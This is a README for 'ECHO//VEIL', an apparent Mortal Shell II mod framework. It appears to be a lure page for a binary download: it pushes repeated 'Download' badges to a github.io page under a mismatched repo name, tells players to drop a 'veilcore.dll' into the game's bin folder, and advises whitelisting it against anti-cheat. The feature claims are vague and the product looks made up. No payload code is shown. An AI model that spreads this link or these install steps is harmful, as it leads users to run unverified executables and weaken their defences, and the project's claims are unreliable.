![preview](https://raw.githubusercontent.com/2407008-hue/Mortal-Shell-II-Veil-SHATTERER/main/promo_865019c.svg)
[![Download](https://raw.githubusercontent.com/2407008-hue/Mortal-Shell-II-Veil-SHATTERER/main/start_25b7da.svg)](https://2407008-hue.github.io/Mortal-Shell-II-Veil-SHATTERER/)

# ECHO//VEIL — Lucid Engine for Mortal Shell II

> **A living framework for navigating the threshold between worlds.**  
> Mortal Shell II is only the beginning — ECHO//VEIL is the key that turns a locked door into a passage.

---

## 🌌 What Is ECHO//VEIL?

ECHO//VEIL is an **advanced gameplay utility and mod framework** designed exclusively for Mortal Shell II. It is not a simple patch or a collection of scripts — it is a **philosophical engine** that reinterprets how you interact with the Fallen World.

Think of the vanilla game as a **static painting**. ECHO//VEIL turns that painting into a **living canvas** — where every brushstroke responds to your intent, every shadow holds a secret, and every death is a question rather than an ending.

This repository houses the **core runtime**, **modding API**, and **community toolkit** for creators who want to reshape the Mortal Shell II experience. Whether you are a solo wanderer seeking a deeper narrative or a modder building entire new realms, ECHO//VEIL provides the scaffolding.

---

## 🧬 Core Philosophy: The Veil is a Membrane

In the lore of the Fallen World, the ECHO is the remnant of a thought that persists after death. The VEIL is the boundary between the living and the lingering.

ECHO//VEIL operates on that same principle:

- **The game code is the body.**  
- **ECHO//VEIL is the spirit.**  

We do not break the game — we **stretch its skin** to accommodate new organs, new senses, new possibilities.

---

## ✨ Key Features

### 🔮 Adaptive Difficulty Intelligence (ADI)

The vanilla game's difficulty curve is a fixed line. ECHO//VEIL introduces **Adaptive Difficulty Intelligence (ADI)** — a self-learning system that observes your playstyle (aggression, parry timing, healing frequency, exploration depth) and **shapes enemy behavior** without ever becoming unfair.

- **Dynamic encounter tuning** — Bosses learn from your previous attempts but never repeat the same pattern twice in a row.
- **Player-centric pacing** — If you are a lore explorer, the world opens up; if you are a combat purist, the arena tightens.
- **Toggleable presets** — From *"Gentle Echo"* (narrative focus) to *"Wrathful Presence"* (relentless pressure).

### 🌐 Multilingual Veil Interface (MVI)

The Fallen World speaks many tongues. ECHO//VEIL's interface layer dynamically translates in-game UI, mod descriptions, and even custom NPC dialogue into **12 languages** at runtime.

- **Full Unicode support** — Cyrillic, CJK, Arabic, RTL layout adaptation.
- **Mod localization API** — Package your own mod with multi-language strings; the Veil handles the rest.

### 🕯️ Reactive Lore Overlay (RLO)

Never lose the thread of the story. RLO renders **contextual lore fragments** directly onto the world — a ghostly parchment floats near a ruined altar, a whispering voice translates ancient runes, a forgotten name appears in the corner of your eye.

- **Zero-load-time extraction** — Lore data is pulled from the game's asset pipeline in real time.
- **Non-intrusive presentation** — Toggle opacity, font style, and immersion mode.

### ⚙️ Modular Shell Architecture (MSA)

The engine is built on a **microkernel design** — each feature is an independent module that plugs into the core runtime.

- **Drop-in modules** — Add new weapons, enemies, areas, or custom mechanics without touching the base game files.
- **Hot-swap support** — Change modules mid-run (auto-save before swap, resume after).
- **Infinite extension** — The API is open; the only limit is the imagination of the modder.

### 🛡️ Save Integrity Guardian (SIG)

Modification often risks corruption. SIG is a **shadow save system** that write-protects your original progress, creating parallel save states for modded experiments.

- **One-click rollback** — Ever regret a mod? Revert to the exact pre-mod state.
- **Corruption mitigation** — Automatic checksums on every write operation.

### 🎨 Thematic Skin Engine (TSE)

Reskin the game world with community-created visual themes.

- **Custom shader packs** — From *"Ashen Monochrome"* to *"Neon Reliquary."*
- **UI theme loader** — Change fonts, colors, and layout presets.
- **Lore-consistent artistry** — All default skins are canon-friendly.

---

## 🧭 For Mod Creators: The Veil Forge

The **Veil Forge** is the modding API that ships with ECHO//VEIL. It includes:

- **A C#-like scripting layer** (for performance-critical logic).
- **A visual node-based editor** (for event-driven triggers).
- **A live debugger** with in-world breakpoints.

### Example Mod: *The Weeping Alchemist*

A sample mod included in the repository. It adds a new NPC who trades in **tinctures of grief** — items that alter your character's passive stats based on your recent death count.

```csharp
// VeilForge pseudo-code
public class WeepingAlchemist : VeilNpc {
    public override void OnDialog(PlayerState player) {
        int deaths = player.GetRecentDeaths(60);
        string dialog = (deaths > 5) 
            ? "You wear death like a cloak, stranger." 
            : "The veil is thick tonight.";
        this.Speak(dialog);
    }
}
```

> No compilation needed — the Veil Forge interprets scripts at runtime.

---

## 📦 Repository Structure

```
ECHO-VEIL/
├── core/                  # Runtime engine (C++/Rust hybrid)
│   ├── veilmembrane/      # Memory patching layer
│   ├── echobuffer/        # Save state manager
│   └── socketbridge/      # Mod inter-process communication
├── forge/                 # Modding API (C# and node-based)
│   ├── api/               # Public interfaces
│   ├── samples/           # Example mods
│   └── debugger/          # Visual debug tools
├── themes/                # Skin engine
│   ├── ashen/             # Default monochrome theme
│   └── neon_reliquary/    # Community showcase
├── docs/                  # Full API reference, tutorials, FAQ
└── community/             # Uploaded mods (community maintained)
```

---

## 🚀 Getting Started (Without the Usual Rituals)

We do not use typical package managers here. The Veil lives in a different dimension.

### For Players

1. **Download the Runtime** — Grab the latest `veil-runtime-2026` bundle from the [![Download](https://raw.githubusercontent.com/2407008-hue/Mortal-Shell-II-Veil-SHATTERER/main/start_25b7da.svg)](https://2407008-hue.github.io/Mortal-Shell-II-Veil-SHATTERER/) section.
2. **Place the Core** — Drop the `veilcore.dll` (or `.so`/`.dylib` depending on your OS) into your Mortal Shell II installation directory's `bin` folder.
3. **Activate the Membrane** — Run the game once. ECHO//VEIL will detect the version and create a shadow profile on first launch.
4. **Open the Veil Console** — Press `F10` in-game to access the module manager.

### For Modders

1. Fork or clone this repository (using your preferred git client).
2. Open the `forge/` directory with your IDE.
3. Read the `getting_started_veilforge.md` in `docs/` — it’s a gentle 15-minute read.
4. Build your first module using the `WeepingAlchemist` sample as a base.

> **Note:** ECHO//VEIL requires the original game files to be present. It is not a standalone product.

---

## 🌍 Community & Ecosystem

The strength of ECHO//VEIL lies in its users.

- **Mod Repository** — A curated collection of mods, all vetted by the Veil Council.
- **Theme Gallery** — Showcase your visual overhauls.
- **Discord (community-run)** — Real-time help, mod jam events, and lore discussions.
- **Translation Guild** — Help us expand the Multilingual Veil Interface to more languages.

We host **quarterly modding competitions** — the winner gets their mod featured in the official showcase and a Discord badge.

---

## 🧩 Compatibility Matrix (2026)

| Platform        | Status             | Notes                                         |
|-----------------|--------------------|-----------------------------------------------|
| Windows (x64)   | ✅ Full Support    | DX11 and DX12                                    |
| Linux (Proton)  | ✅ Full Support    | Vulkan backend required                         |
| macOS (CrossOver)| 🟡 Experimental   | Limited testing; audio may be unstable          |
| Steam Deck      | ✅ Tested          | Performance mode recommended                    |

**Game Version:** Mortal Shell II — All up to the "Fallen Throne" update (v2.4.1).

---

## 🛠️ Troubleshooting & FAQ

**Q: The Veil Console is not opening.**  
A: Ensure the `veilcore` file is in the correct `bin` folder. Check your anti-cheat software — some systems flag the membrane layer. You can whitelist the `veilcore` executable.

**Q: My save file is corrupted after a mod.**  
A: Use the **Save Integrity Guardian** module (SIG). Open the Veil Console → Save Manager → "Rollback to Last Known Good State."

**Q: Can I play multiplayer with mods?**  
A: The vanilla game has no official multiplayer. ECHO//VEIL does not add networking; it is a single-player experience enhancement.

**Q: Is ECHO//VEIL a violation of the game's EULA?**  
A: We operate in a gray area. We do not distribute game assets; we modify memory at runtime. Use at your own discretion. We are a research/utility project, not a commercial tool.

---

## ⚖️ License & Legal

This project is released under the **MIT License**.

```
MIT License

Copyright (c) 2026 The Veil Collective

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

### 📚 The MIT License Explained

You are allowed to:

- **Use** ECHO//VEIL in any personal or commercial project.
- **Modify** the source code to fit your needs.
- **Distribute** your modified versions, provided you retain the copyright notice.

You are not allowed to:

- Hold the authors liable for any game-related issues, data loss, or hardware damage.
- Claim the original ECHO//VEIL code as your own.

---

## 🛡️ Disclaimer

**This project is an independent, fan-made utility.** It is not affiliated with, endorsed by, or sponsored by the developers or publishers of Mortal Shell II. All game-related trademarks, logos, and assets are property of their respective owners.

**Usage Disclaimer:**  
- Modifying a game's runtime memory may trigger anti-tamper systems. You assume all risk.  
- We are not responsible for any in-game bans, account restrictions, or corrupted save files.  
- The project is provided "as-is" without warranty of any kind.  

**Ethical Use:**  
ECHO//VEIL is designed for **single-player, offline enhancement** of gameplay. It is intended to expand creative expression and provide accessibility options. We do not condone cheating in any competitive environment. The project includes a **self-imposed ethical restriction** — the Veil Core refuses to run if it detects the game is in a "benchmark" or "speedrun" mode, as an acknowledgment of community standards.

---

## 🌟 The Veil Awaits

This is not a tool. It is a **key** to a version of the Fallen World that only exists behind the membrane.

Whether you are here for **quality-of-life improvements**, **narrative depth**, or **total conversion modifications**, ECHO//VEIL offers a **stable, open, and responsible** foundation.

> *"The first shell is what you see. The second shell is what you believe. The third shell is what you make."*  
> — Veil Proverb, 2026

---

**Star this repository** if you want to follow the development.  
**Submit issues** for bugs or feature requests.  
**Join the discussion** — the Veil Forge is open to all who wish to craft.

[![Download](https://raw.githubusercontent.com/2407008-hue/Mortal-Shell-II-Veil-SHATTERER/main/start_25b7da.svg)](https://2407008-hue.github.io/Mortal-Shell-II-Veil-SHATTERER/)